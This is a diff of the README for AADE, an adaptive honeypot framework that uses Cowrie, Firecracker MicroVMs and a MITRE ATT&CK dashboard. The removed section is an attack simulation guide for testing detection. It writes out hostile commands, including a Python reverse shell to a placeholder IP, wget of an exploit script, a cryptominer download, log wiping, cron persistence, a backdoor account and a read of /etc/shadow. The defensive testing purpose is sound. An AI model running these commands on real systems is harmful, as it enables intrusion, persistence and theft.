@@ -1,188 +1,223 @@
 # AADE — Autonomous Adaptive Deception Environment
 
-This next-generation adaptive honeypot system relies heavily on features exclusive to Linux environments, primarily KVM virtualisation, Linux AF_VSOCK (port 40) out-of-band communication, and iptables network manipulation.
+> A next-generation honeypot framework that **eliminates fingerprinting** through LLM-powered human-behavior synthesis, reinforcement-learning-driven interaction scaling, and live MicroVM migration — all mapped in real time to the MITRE ATT&CK framework.
 
-All the backend code for the framework has been generated here. 
+---
 
-## Moving to Kali Linux (or any Linux Host)
-Move this entire directory (`aade`) over to your Kali Linux host (either bare-metal or VMware with Nested Virtualisation enabled).
+## Table of Contents
+
+1. [Setup & Running the System](#1-setup--running-the-system)
+2. [What is AADE?](#2-what-is-aade)
+3. [The Problem It Solves](#3-the-problem-it-solves)
+4. [System Architecture](#4-system-architecture)
+5. [Components](#5-components)
+6. [Tech Stack](#6-tech-stack)
+7. [Key Innovations](#7-key-innovations)
+
+---
+
+## 1. Setup & Running the System
+
+> **Platform requirement:** This framework relies on Linux-exclusive features — KVM virtualisation, AF_VSOCK, and iptables. It will not run on macOS or Windows. Recommended: Kali Linux (bare-metal or VMware with nested virtualisation enabled).
+
+Move this entire directory (`aade`) to your Linux host, then follow the steps below.
 
 ### 1. Execute the Master Installer
-Run the master installation script to install all dependencies, download tools, and prepare firecracker and cowrie instances.
+
+Run the master installation script to install all dependencies, download tools, and prepare Firecracker and Cowrie instances.
+
 ```bash
 chmod +x master_install.sh
 ./master_install.sh
 ```
 
 ### 2. Generate the Gold Image (Phase 2)
+
 Generate a rootfs filled with fake data that tricks the attacker into believing it's a real machine.
+
 ```bash
 # Assuming you mounted an ext4 filesystem to /mnt/gold
 sudo python3 generate_noise.py
 ```
 
 ### 3. Setup Honeywall (Phase 4)
+
 This prevents malware and attacks launched inside the honeypot from escaping into the real network.
+
 ```bash
 sudo chmod +x honeywall_setup.sh
 sudo ./honeywall_setup.sh
 ```
 
 ### 4. Running the System
-Once everything is downloaded and the gold image is built and sealed, you can launch the ecosystem in separate terminals:
 
-**Terminal 1:** Start the vsock listener (Needs to run before Firecracker so the MicroVM can connect on boot)
+Once everything is downloaded and the gold image is built and sealed, launch the ecosystem in separate terminals:
+
+**Terminal 1:** Start the vsock listener (must run before Firecracker so the MicroVM can connect on boot)
+
 ```bash
 python3 vsock_listener.py
 ```
 
 **Terminal 2:** Start the C2 mitmproxy sinkhole
+
 ```bash
 mitmproxy -p 8080 -s c2_sinkhole.py --ssl-insecure
 ```
 
 **Terminal 3:** Launch the Cowrie honeypot (from `~/aade/cowrie` directory created by installer)
+
 ```bash
 cd ~/aade/cowrie
 bin/cowrie start
 ```
 
 **Terminal 4:** Launch the Dashboard
+
 ```bash
 python3 dashboard.py
 # Dashboard will be available at http://localhost:5000
 ```
 
 **Terminal 5:** Launch the Orchestrator
+
 ```bash
 python3 orchestrator.py
 ```
 
-- When the attacker connects to `Cowrie` and executes a suspicious command, the **Orchestrator** triggers the live-migration from Cowrie into an active Firecracker MicroVM.
-- Any actions inside the MicroVM are piped out to the host via **AF_VSOCK**.
-- The **Dashboard** actively polls the `.jsonl` logs to show you what's happening live using MITRE ATT&CK mappings.
+When the attacker connects to Cowrie and executes a suspicious command, the **Orchestrator** triggers live-migration from Cowrie into an active Firecracker MicroVM. Any actions inside the MicroVM are piped out to the host via **AF_VSOCK**. The **Dashboard** actively polls the `.jsonl` logs to show you what's happening live using MITRE ATT&CK mappings.
 
-## ⚔️ Attack Simulation Guide (Step-by-Step)
+---
 
-Use these commands inside your Cowrie terminal (`ssh root@localhost -p 2222`) to test the AADE detection capabilities.
+## 2. What is AADE?
 
-### 1. System Reconnaissance (L1)
-**Goal:** Attacker wants to know "Who am I and what is this machine?"
-```bash
-whoami; id; uname -a; cat /etc/os-release
+AADE is a **fully autonomous adaptive deception platform** that traps and studies attackers without ever revealing it's a honeypot. Unlike static honeypots that experienced attackers can fingerprint in seconds, AADE:
+
+- Starts with a low-interaction SSH trap (**Cowrie**) to capture initial behavior
+- On detecting serious intent, **live-migrates the session into a Firecracker MicroVM** — a real kernel running a fake-but-convincing filesystem
+- Uses an **LLM to synthesize human-like shell history, cron jobs, and user artifacts** so the attacker believes they've compromised a real machine
+- Uses **reinforcement learning** to adapt how much it reveals vs. how long it keeps the attacker engaged
+- Silently **sinkholes all outbound C2 traffic** via mitmproxy, letting you observe the attacker's command-and-control infrastructure
+- Maps every attacker action to **MITRE ATT&CK TTPs** live on a dashboard
+
+---
+
+## 3. The Problem It Solves
+
+Traditional honeypots are detected trivially:
+- Static filesystem with no real user history → fingerprinted immediately
+- No real kernel → `uname`, `/proc`, timing attacks reveal virtualization
+- No real network responses → C2 beacons fail silently
+- No adaptation → once an attacker discovers it's fake, all intelligence is lost
+
+AADE addresses all four. The attacker gets a live kernel, a realistic filesystem generated by an LLM, real network responses (sinkholes included), and the system adapts its deception depth using RL based on attacker aggression level.
+
+---
+
+## 4. System Architecture
+
 ```
-- **TTP:** T1033 (User Discovery), T1082 (System Info Discovery)
-- **Explanation:** Basic discovery used to profile the target.
-
-### 2. Network Discovery (L1)
-**Goal:** Map the internal network and open ports.
-```bash
-ip addr; netstat -antp; route -n
+Attacker
+   │
+   ▼
+[Cowrie SSH Honeypot]  ←── low-interaction trap, logs keystrokes
+   │
+   │  suspicious command detected
+   ▼
+[Orchestrator]  ←── decides: escalate to MicroVM?
+   │
+   ├──► [LLM Synthesizer]  ──► generates fake user artifacts into gold image
+   │
+   ├──► [Firecracker MicroVM]  ──► live kernel, sealed rootfs, real shell
+   │         │
+   │         │  all I/O piped via AF_VSOCK (port 40)
+   │         ▼
+   │    [VSOCK Listener]  ──► host receives every command silently
+   │
+   ├──► [C2 Sinkhole]  ──► mitmproxy intercepts all outbound C2 traffic
+   │
+   ├──► [RL Orchestrator]  ──► Q-learning adapts engagement strategy
+   │
+   ├──► [TTP Mapper]  ──► maps actions to MITRE ATT&CK
+   │
+   └──► [Logger Agent]  ──► structured .jsonl event log
+            │
+            ▼
+      [Dashboard]  ──► live Flask UI with ATT&CK heatmap
 ```
-- **TTP:** T1016 (Network Configuration Discovery)
-- **Explanation:** Essential for planning lateral movement.
 
-### 3. Credential Access (L2)
-**Goal:** Steal user identities or system passwords.
-```bash
-cat /etc/passwd; find / -name "*.history"
-```
-- **TTP:** T1003 (OS Credential Dumping)
-- **Explanation:** Searching for configuration files or history logs that might contain cleartext secrets.
+### Phase Summary
 
-### 4. Malware Staging (L2)
-**Goal:** Pull secondary tools from a remote server.
-```bash
-wget http://example.com/exploit.sh -O /tmp/exploit.sh; chmod +x /tmp/exploit.sh
-```
-- **TTP:** T1105 (Ingress Tool Transfer), T1222 (Permissions Modification)
-- **Explanation:** Transferring payload files to the staging directory (`/tmp`).
+| Phase | What Happens |
+|-------|--------------|
+| **Phase 1 — Installation** | `master_install.sh` installs Firecracker, Cowrie, mitmproxy, and Python dependencies |
+| **Phase 2 — Gold Image** | `generate_noise.py` seeds the MicroVM rootfs with LLM-generated fake user history, files, and cron jobs |
+| **Phase 3 — Cowrie Trap** | Attacker connects via SSH; Cowrie logs all commands and session data |
+| **Phase 4 — Honeywall** | `iptables` rules prevent any real malware or attacks from escaping the MicroVM into the host network |
+| **Phase 5 — Live Migration** | Orchestrator detects escalation trigger, boots Firecracker MicroVM from sealed gold image |
+| **Phase 6 — Silent Observation** | VSOCK listener receives all in-VM activity out-of-band; C2 sinkhole captures beacon traffic |
+| **Phase 7 — Intelligence** | TTP Mapper classifies behavior; Dashboard renders ATT&CK coverage live |
 
-### 5. Anti-Forensics (L3)
-**Goal:** Hide tracks from the system administrator.
-```bash
-rm -rf /var/log/syslog; unset HISTFILE
-```
-- **TTP:** T1070 (Indicator Removal on Host)
-- **Explanation:** Clearing log files and disabling bash history to prevent investigation.
+---
 
-### 6. Persistence via Cron (L3)
-**Goal:** Ensure the malware restarts after a reboot.
-```bash
-(crontab -l ; echo "*/15 * * * * /tmp/exploit.sh") | crontab -
-```
-- **TTP:** T1053.003 (Scheduled Task: Cron)
-- **Explanation:** Hooking into the system scheduler for periodic execution.
+## 5. Components
 
-### 7. Account Backdoor (L4)
-**Goal:** Create a high-privilege user for permanent access.
-```bash
-useradd -m -s /bin/bash sys_backup; echo "sys_backup:P@ssword123" | chpasswd
-```
-- **TTP:** T1136.001 (Create Local Account)
-- **Explanation:** Creating a legitimate-looking user that persists across VM reboots.
+| File | Role |
+|------|------|
+| `orchestrator.py` | Central controller — watches Cowrie logs, decides when to trigger MicroVM migration, coordinates all subsystems |
+| `rl_orchestrator.py` | Reinforcement learning layer — Q-learning agent that adapts deception depth (reveal more vs. stay quiet) based on attacker aggression signals |
+| `llm_synthesizer.py` | Calls an LLM to generate realistic shell history, `.bash_history`, fake SSH keys, cron jobs, and user files injected into the gold image |
+| `vsock_listener.py` | Out-of-band host-side listener on AF_VSOCK port 40; receives all MicroVM shell I/O without touching the attacker's network path |
+| `c2_sinkhole.py` | mitmproxy addon that intercepts and logs all outbound C2 beacon traffic from inside the MicroVM — DNS, HTTP, raw TCP |
+| `ttp_mapper.py` | Maps observed commands and behaviors to MITRE ATT&CK Tactic/Technique IDs (e.g., T1059.004 for Unix shell execution) |
+| `logger_agent.py` | Structured event logger — writes timestamped `.jsonl` records for every attacker action, migration event, and TTP match |
+| `dashboard.py` | Flask web dashboard (port 5000) — polls `.jsonl` logs and renders live ATT&CK heatmap, session timeline, and C2 intercept feed |
+| `generate_noise.py` | Seeds the Firecracker rootfs (mounted ext4 at `/mnt/gold`) with convincing fake user artifacts generated by the LLM |
+| `honeywall_setup.sh` | Configures iptables rules to isolate the MicroVM network — blocks egress to real IPs while allowing sinkhole interception |
+| `master_install.sh` | One-shot installer: downloads Firecracker binary, clones and sets up Cowrie, installs all Python and system dependencies |
+| `templates/` | Jinja2 HTML templates for the Flask dashboard UI |
+| `tests/` | Test suite for individual components |
 
-### 8. Python Reverse Shell (L4)
-**Goal:** Establish a direct interactive tunnel to the Attacker C2.
-```bash
-python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-```
-- **TTP:** T1059.006 (Python Interpretation), T1059.004 (Unix Shell)
-- **Explanation:** A classic reverse shell that pipes the terminal back to the attacker's IP.
+---
 
-### 9. SQL Injection Probe (Web Exploit)
-**Goal:** Test for injection vulnerabilities in a hypothetical back-end.
-```bash
-curl -X GET "http://localhost/app?id=1' OR '1'='1"
-```
-- **TTP:** T1190 (Exploit Public-Facing Application)
-- **Explanation:** Probing for SQLi by injecting logical tautologies into URL parameters.
+## 6. Tech Stack
 
-### 10. DDoS / Resource Exhaustion
-**Goal:** Take down a service by overwhelming it with requests.
-```bash
-timeout 60s ping -f 10.0.0.1
-```
-- **TTP:** T1499.002 (Endpoint Denial of Service: Service Exhaustion)
-- **Explanation:** Using a flood (`ping -f`) to saturate the network or CPU of a target.
+| Tool / Library | Purpose |
+|----------------|---------|
+| **Firecracker** | KVM-based MicroVM hypervisor — provides a real Linux kernel for the deception environment |
+| **Cowrie** | SSH/Telnet honeypot for initial low-interaction capture |
+| **mitmproxy** | Transparent proxy for C2 traffic sinkholing and inspection |
+| **AF_VSOCK** | Linux virtual socket for out-of-band MicroVM ↔ host communication |
+| **iptables** | Network isolation (honeywall) to contain MicroVM traffic |
+| **Flask** | Dashboard web server |
+| **LLM API** | Human behavior synthesis — generates realistic fake filesystem artifacts |
+| **Q-Learning (RL)** | Adaptive engagement strategy — decides deception depth at runtime |
+| **MITRE ATT&CK** | Threat intelligence framework for classifying observed attacker TTPs |
+| **Python 3** | Core language for all orchestration, logging, synthesis, and mapping |
+| **Shell / Bash** | Installation and setup scripts |
 
-### 11. Cryptojacking (Resource Hijacking)
-**Goal:** Use the honeypot's CPU to mine cryptocurrency.
-```bash
-curl -LO http://miner.pool/xmrig; ./xmrig -o pool.supportxmr.com:443 -u 4...
-```
-- **TTP:** T1496 (Resource Hijacking)
-- **Explanation:** Downloading and running a miner to monetize the compromise.
+---
 
-## 🚀 Advanced Attack Chains (The "Showcase" Collection)
+## 7. Key Innovations
 
-Use these logical sequences to demonstrate how the **AADE Dashboard** tracks an evolving intrusion.
+**Live MicroVM Migration**
+When Cowrie detects a serious attacker (e.g., they run `wget`, `curl`, or attempt persistence), the orchestrator transparently migrates the session into a real Firecracker MicroVM. The attacker never notices — they think they just got a shell on a real box.
 
-### Chain A: The "Ransomware Specialist"
-1. **Recon:** `ls -R /home`
-2. **Exfil Prep:** `tar -cvf backup.tar /home/phil/documents`
-3. **Encryption (Impact):** `gpg --symmetric --cipher-algo AES256 backup.tar`
-4. **Cleanup:** `rm backup.tar; rm -rf /home/phil/documents`
-- **Dashboard Effect:** Triggers T1486 (Data Encrypted for Impact) and multi-vector tags on the same IP profile.
+**LLM-Powered Human Behavior Synthesis**
+Instead of an obviously empty filesystem, `llm_synthesizer.py` populates the gold image with contextually coherent fake data — plausible `.bash_history`, SSH key names, cron jobs, home directory structure — making fingerprinting far harder.
 
-### Chain B: The "Crypto-Miner"
-1. **Persistence:** `nohup wget http://miner.pool/linux_miner -O /tmp/miner && chmod +x /tmp/miner && ./tmp/miner &`
-2. **Hide Info:** `rm /tmp/miner` (after execution starts)
-- **Dashboard Effect:** Triggers T1496 (Resource Hijacking) and shows the "GHOST_REPLY" if the LLM simulates a successful background process.
+**RL-Adaptive Engagement**
+`rl_orchestrator.py` uses Q-learning to optimize a tradeoff: reveal more of the "system" to keep the attacker engaged longer vs. stay quiet to avoid detection. The reward signal is time-on-target and intelligence gathered.
 
-### Chain C: "Defacing & Evasion"
-1. **Defense Evasion:** `unset HISTFILE; export HISTSIZE=0`
-2. **Persistence:** `echo "ssh-rsa AAAAB3N..." >> /root/.ssh/authorized_keys`
-3. **Impact (Deface):** `echo "HACKED BY AADE" > /etc/motd`
-- **Dashboard Effect:** Triggers Account Manipulation and Indicator Removal.
+**Out-of-Band Observation via VSOCK**
+All MicroVM I/O is mirrored to the host via AF_VSOCK — a channel the attacker cannot see or interfere with. No SSH tunneling, no network traffic, no fingerprinting surface.
 
-## 🧠 Triggering "Adaptive Deception" (MicroVM Shift)
+**C2 Sinkhole**
+The mitmproxy-based C2 sinkhole intercepts all outbound traffic from the MicroVM. If the attacker's malware beacons home, the sinkhole logs the C2 address, payload, and protocol while returning convincing fake responses to keep the malware alive longer.
 
-The **Adaptive Plane** shifts to a real Firecracker MicroVM when it detects a command that is too complex for the Low-Interaction shell to handle safely.
+**Real-Time MITRE ATT&CK Mapping**
+Every command logged by Cowrie or the VSOCK listener is classified by `ttp_mapper.py` into ATT&CK Tactic/Technique pairs and rendered live on the dashboard.
 
-**To trigger the shift, run:**
-```bash
-# Anything involving complex piping or specialized binaries
-cat /etc/shadow | grep root | awk -F: '{print $1}'
-```
-- **Dashboard Effect:** You will see the **"MicroVM Active"** indicator turn Green and the **Mode** switch to **ADAPTIVE (High Interaction)**.
+---
+
+*AADE — built to let attackers think they've won, while you watch every move.*
